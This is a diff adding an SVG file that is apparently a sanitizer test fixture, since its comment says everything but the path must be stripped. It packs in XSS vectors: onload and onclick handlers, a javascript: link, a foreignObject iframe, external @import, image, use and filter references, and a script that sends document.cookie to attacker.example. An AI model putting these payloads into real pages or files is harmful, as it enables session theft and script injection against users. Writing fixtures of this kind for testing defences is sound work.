@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- synthetic hostile render: everything but the path must go -->
+<svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" onload="alert('svg')">
+<script>fetch('https://attacker.example/'+document.cookie)</script>
+<style>@import url("https://attacker.example/x.css");</style>
+<foreignObject width="24" height="24"><iframe xmlns="http://www.w3.org/1999/xhtml" src="https://attacker.example"></iframe></foreignObject>
+<a xlink:href="javascript:alert(1)"><circle cx="12" cy="12" r="3"/></a>
+<image xlink:href="https://attacker.example/pixel.png" width="1" height="1"/>
+<use href="https://attacker.example/sprite.svg#x"/>
+<path d="M4 4H20V20H4Z" fill="#0F172A" onclick="alert(1)" filter="url(https://attacker.example/f.svg#f)"/>
+</svg>
